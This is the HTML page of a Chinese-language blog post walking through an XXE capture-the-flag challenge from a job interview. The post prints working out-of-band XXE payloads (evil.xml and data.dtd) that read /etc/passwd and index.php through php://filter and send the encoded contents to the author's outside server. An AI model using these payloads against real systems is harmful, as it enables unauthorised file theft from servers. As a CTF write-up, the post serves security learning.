@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="sh4douu">
+
+
+
+<meta name="description" content="0x00 说在前面的话最近面试一家安全公司，拿到一套CTF题目作为面试前的技术能力测试。其中有一道XEE漏洞的题目，碰巧最近正在研究学习XXE漏洞，过程中遇到了一些坑，隧做个记录。 下面直接进入主题…">
+<meta name="keywords" content="XXE,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次面试某安全公司一道XXE漏洞CTF面试题">
+<meta property="og:url" content="https://sakuxa.com/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/index.html">
+<meta property="og:site_name" content="IT技术学习分享自留地">
+<meta property="og:description" content="0x00 说在前面的话最近面试一家安全公司，拿到一套CTF题目作为面试前的技术能力测试。其中有一道XEE漏洞的题目，碰巧最近正在研究学习XXE漏洞，过程中遇到了一些坑，隧做个记录。 下面直接进入主题…">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://sakuxa.com/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/00.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/01testxml.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/QQ截图20190315163014.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/02prove.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/04readpasswd.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/06readindex.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/flag.png">
+<meta property="og:updated_time" content="2019-03-18T02:40:32.146Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记一次面试某安全公司一道XXE漏洞CTF面试题">
+<meta name="twitter:description" content="0x00 说在前面的话最近面试一家安全公司，拿到一套CTF题目作为面试前的技术能力测试。其中有一道XEE漏洞的题目，碰巧最近正在研究学习XXE漏洞，过程中遇到了一些坑，隧做个记录。 下面直接进入主题…">
+<meta name="twitter:image" content="https://sakuxa.com/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/00.png">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="IT技术学习分享自留地" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/LimeWire.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>记一次面试某安全公司一道XXE漏洞CTF面试题 | IT技术学习分享自留地</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/tx.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">sh4douu</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">努力成为自己认可的黑客...</p>
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="/about/" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/sh4douu" title="GitHub"></a>
+                            
+                                <a class="fa 微信" href="/about/" title="微信"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cheatsheet/">Cheatsheet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Getshell/">Getshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTML文档解析/">HTML文档解析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Language/">Language</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL/">MySQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OWASP-Top10-2017/">OWASP Top10 2017</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHPCMSv9/">PHPCMSv9</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Payload/">Payload</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python基础/">Python基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XML/">XML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XML注入/">XML注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/任意文件下载/">任意文件下载</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/干货/">干货</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/必会技能/">必会技能</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/技术/">技术</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/收集/">收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传/">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件包含/">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件权限/">文件权限</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/权限提升/">权限提升</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/环境搭建/">环境搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编码与解码/">编码与解码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/过滤与绕过/">过滤与绕过</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/靶场/">靶场</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/靶机/">靶机</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">致力于网络安全</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">sh4douu</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/tx.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">sh4douu</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">努力成为自己认可的黑客...</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="/about/" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/sh4douu" title="GitHub"></a>
+                            
+                                <a class="fa 微信" target="_blank" href="/about/" title="微信"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
+</nav>
+      <div class="body-wrap"><article id="post-记一次面试某安全公司一道XXE漏洞CTF面试题" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/" class="article-date">
+      <time datetime="2019-03-15T07:54:09.000Z" itemprop="datePublished">2019-03-15</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      记一次面试某安全公司一道XXE漏洞CTF面试题
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XXE/">XXE</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="0x00-说在前面的话"><a href="#0x00-说在前面的话" class="headerlink" title="0x00 说在前面的话"></a>0x00 说在前面的话</h3><p>最近面试一家安全公司，拿到一套CTF题目作为面试前的技术能力测试。其中有一道XEE漏洞的题目，碰巧最近正在研究学习XXE漏洞，过程中遇到了一些坑，隧做个记录。</p>
+<p>下面直接进入主题…</p>
+<a id="more"></a>
+<h3 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h3><h4 id="1-起步"><a href="#1-起步" class="headerlink" title="1.起步"></a>1.起步</h4><p>首先，点击题目链接进入，发现是一个RSS checker的页面，页面有一个输入框要求输入URL地址，直接随意输入一个地址，点击提交查询。</p>
+<p><img src="/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/00.png" alt></p>
+<p>提交后返回XML文档无效“XML document is not valid”的信息，由此可以知道此处应该是需要我们提供一个XML文档的URL地址。既然是XML文档，那么首先考虑到的存在XEE漏洞。</p>
+<h4 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2.漏洞验证"></a>2.漏洞验证</h4><p>接下来就是要验证是否存在XXE漏洞，确定漏洞存在的根本是要证明目标服务器允许外部实体。所以证明的整体思路为：</p>
+<blockquote>
+<p>1.让目标服务器访问请求我们提供的XML文档。</p>
+<p>2.我们提供的XML文档中使用了外部实体。</p>
+<p>3.若我们的XML文档中的外部实体被解析了，则证明漏洞存在。</p>
+</blockquote>
+<p>首先，要让目标服务器请求我们的XML文档的话，我们得先有一台外网服务器，话不多说，直接去搞一个腾讯云学生服务器。</p>
+<p>搞定了服务器后，直接在服务器上创建一个XML文档，命名为evil.xml，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE ANY [ </span><br><span class="line">&lt;!ENTITY % test SYSTEM &quot;http://148.x.x.141/xxe_test&quot;&gt;</span><br><span class="line">%test;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/01testxml.png" alt></p>
+<p>接着为了让目标服务器可以获取我们的evil.xml，我们需要一个HTTP服务器。直接使用Python建立一个简单的WEB服务，输入命令：<code>python -m SimpleHTTPServer 80</code>。这样我们的服务器就会开启一个监听在80端口的HTTP服务。</p>
+<p><img src="/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/QQ截图20190315163014.png" alt></p>
+<p>再接下来就是要让目标服务器请求我们的evil.xml了，在网页输入我们evil.xml的URL然后点击提交查询，然后观察我们服务器上HTTP服务的访问情况。</p>
+<p><img src="/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/02prove.png" alt></p>
+<p>在上图中，可以看到目标服务器向我们的服务器发起了两次请求，第一次请求evil.xml文档。第二次请求了<code>/xxe_test</code>，这正是我们在evil.xml中定义的引用外部实体。简单说就是我们在网页上输入我们的evil.xml的URL地址，目标服务器不但请求了我们的evil.xml文档，还解析执行了evil.xml的内容。evil.xml中<code>&lt;!ENTITY % test SYSTEM &quot;http://148.x.x.141/xxe_test&quot;&gt;</code>就是外部实体，若允许外部实体，这条语句就会执行，执行的结果就是向<code>http://148.x.x.141/xxe_test</code>(即我们的服务器)发起请求。我们在服务器上看到该请求，也就证明目标服务器允许外部实体，也即存在XXE漏洞。</p>
+<h4 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h4><p>确定了漏洞的存在，接下来就是利用漏洞搞事。XXE最常见的利用方式就是进行任意文件读取。获取敏感重要文件的内容。</p>
+<p>读取文件之前我们需要确定以什么方式读取：直接回显还是带外通道。</p>
+<p>直接回显即目标服务器会把结果直接放于响应页面中返回。观察响应页面就只有XML文档有效或无效的信息。显然我们只能采取带外通道读取的方式。读取文件的大概思路如下：</p>
+<blockquote>
+<p>1.确定要读取的文件，如/etc/passwd。</p>
+<p>2.再创建一个文件，文件内容是定义实体，具体内容见下面。</p>
+<p>3.修改evil.xml的内容，并将上一步创建的文件引用进来，具体内容见下面。</p>
+</blockquote>
+<p>首先，我们先尝试读取目标服务器的<code>/etc/passwd</code>文件。evil.xml文件内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE ANY [ </span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://148.70.34.141/data.dtd&quot;&gt;</span><br><span class="line">%dtd; %payload; %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>第3行作用是读取<code>/etc/passwd</code>文件内容，并使用php filter将内容进行压缩及Base64编码。</p>
+</li>
+<li><p>第4行引用了另一个文件，文件名为data.dtd，文件的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://148.70.34.141/?data=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>该文件定义了一个实体，实体的内容又定义了另一个实体，内层实体的作用是将第三行压缩打包的内容作为HTTP请求参数发送到我们的HTTP服务器上。</li>
+<li><code>&amp;#37;</code>是<code>%</code>的实体，内层的实体的<code>%</code>必须要使用实体形式，否则是不能解析的。</li>
+<li>之所以还需要创建该文件，而不能将该文件内容直接定义在evil.xml中，是因为直接在evil.xml中定义是不生效的，不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</li>
+</ul>
+</li>
+<li><p>大概梳理一下两个文件的实体解析过程：</p>
+<blockquote>
+<ol>
+<li><p><code>%dtd;</code>会执行evil.xml的第3行，执行的结果是引用了<code>data.dtd</code>文件，可以简单认为将<code>data.dtd</code>的文件内容替换<code>%dtd;</code>。</p>
+</li>
+<li><p><code>%payload;</code>执行的就是<code>data.dtd</code>的内容，可简单认为，<code>%payload;</code>会被<code>&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://148.70.34.141/?data=%file;&#39;&gt;</code>进行替换。</p>
+</li>
+<li><code>%send;</code>会向<code>http://148.70.34.141/?data=%file;</code>发起请求，而发起请求前，<code>%file;</code>也会被解析，被压缩加密的<code>/etc/passwd</code>文件内容进行替换。</li>
+</ol>
+</blockquote>
+</li>
+</ul>
+<p>编写好Payload文件之后，继续之前的操作，让目标服务器请求我们的evil.xml文件。</p>
+<p><img src="/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/04readpasswd.png" alt></p>
+<p>并没有成功读取<code>/etc/passwd</code>，而是报错了，根据错误信息我们可以知道，目标服务器对允许读取的路径进行了权限控制，只允许读取的路径为：<code>/challenge/web-serveur/ch29</code>。</p>
+<p>那么我们只能读取其他文件了，根据错误信息我们还可以知道，被允许读取的路径下，存在一个<code>index.php</code>文件，尝试读取该文件，只需要的evil.xml文件中的<code>/etc/passwd</code>改为<code>./index.php</code>（允许使用相对路径）即可。</p>
+<p>修改好evil.xml文件后，继续让目标服务器请求。发现被压缩加密的<code>index.php</code>文件内容被成功发送到我们的服务器。</p>
+<p><img src="/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/06readindex.png" alt></p>
+<p>接下来就是将压缩编码内容进行解压解码。此处可以编写一个接收的页面进行解压解码。由于环境原因，我的操作是将压缩编码的文件内容复制保存到一个文件中，文件名tmp.txt。然后创建一个php文件，内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo file_get_contents(&quot;php://filter/read=convert.base64-decode/zlib.inflate/resource=tmp.txt&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>将该php文件放到phpstudy的web根目录下并访问，就可以在页面中找到flag。</p>
+<p><img src="/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/flag.png" alt></p>
+<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>做下来之后，题目的难度不算高，但是期间遇到了一个坑，感觉payload什么的都设置的没有问题了，但是一直读取不了文件，为此花了很长时间，最终查了一下资料才知道，使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错。</p>
+<p>刚开始使用的是：<code>php://filter/read=convert.base64-decode/resource=</code>，只对文件内容进行编码，所以文件过大无法发送。后面使用：<code>php://filter/read=convert.base64-decode/zlib.inflate/resource=</code>进行压缩编码才成功读取。</p>
+<blockquote>
+<p>压缩及编码：<code>echo file_get_contents(&quot;php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&quot;);</code><br>解压及解码：<code>echo file_get_contents(&quot;php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1&quot;);</code></p>
+</blockquote>
+<p><strong>参考链接：</strong></p>
+<p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/">记一次面试某安全公司一道XXE漏洞CTF面试题</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">sh4douu</a></p>
+        <p><span>发布时间:</span>2019-03-15, 15:54:09</p>
+        <p><span>最后更新:</span>2019-03-18, 10:40:32</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/" title="记一次面试某安全公司一道XXE漏洞CTF面试题">https://sakuxa.com/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://sakuxa.com/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/　　作者: sh4douu" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019/03/18/00python基础学习系列之动态类型/">
+                    Chapter 1：Python基础学习系列之动态类型
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/">
+                    Chapter 1：SQL注入系列之MySQL基础知识
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-说在前面的话"><span class="toc-number">1.</span> <span class="toc-text">0x00 说在前面的话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-正文"><span class="toc-number">2.</span> <span class="toc-text">0x01 正文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-起步"><span class="toc-number">2.1.</span> <span class="toc-text">1.起步</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-漏洞验证"><span class="toc-number">2.2.</span> <span class="toc-text">2.漏洞验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-漏洞利用"><span class="toc-number">2.3.</span> <span class="toc-text">3.漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-总结"><span class="toc-number">3.</span> <span class="toc-text">0x03 总结</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"记一次面试某安全公司一道XXE漏洞CTF面试题　| IT技术学习分享自留地　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/03/18/00python基础学习系列之动态类型/" title="上一篇: Chapter 1：Python基础学习系列之动态类型">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/" title="下一篇: Chapter 1：SQL注入系列之MySQL基础知识">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/03/18/01python基础学习系列之字符串/">01python基础学习系列之字符串</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/18/00python基础学习系列之动态类型/">Chapter 1：Python基础学习系列之动态类型</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/15/记一次面试某安全公司一道XXE漏洞CTF面试题/">记一次面试某安全公司一道XXE漏洞CTF面试题</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/">Chapter 1：SQL注入系列之MySQL基础知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/11/0x02-XSS学习系列之练习靶场01/">Chapter 3：XSS学习系列之prompt(1) XSS挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/11/0x01-XSS学习系列之漏洞原理/">Chapter 2：XSS学习系列之漏洞原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/07/0x00-XSS学习系列之解析HTML文档/">Chapter 1：XSS学习系列之浏览器解析HTML文档</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/05/文件上传漏洞/">文件上传漏洞（File Upload）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/04/xxe-tool/">XXE漏洞利用工具及其资源</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/01/XXE/">XXE（XML External Entity）漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/28/xml/">XML基本知识学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/28/文件与目录权限/">文件与目录权限</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/26/hack-zico/">Vulnhub靶机渗透笔记——Zico2</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/25/phpcms9-6-1/">PHPCMSv9.6.1任意文件下载漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/22/GitNote/">Git基本命令及使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/22/干货杂项收集/">干货杂项收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/21/build-blog/">博客搭建记录 Node.js + Hexo + Yelee + Git Pages</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019 sh4douu
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
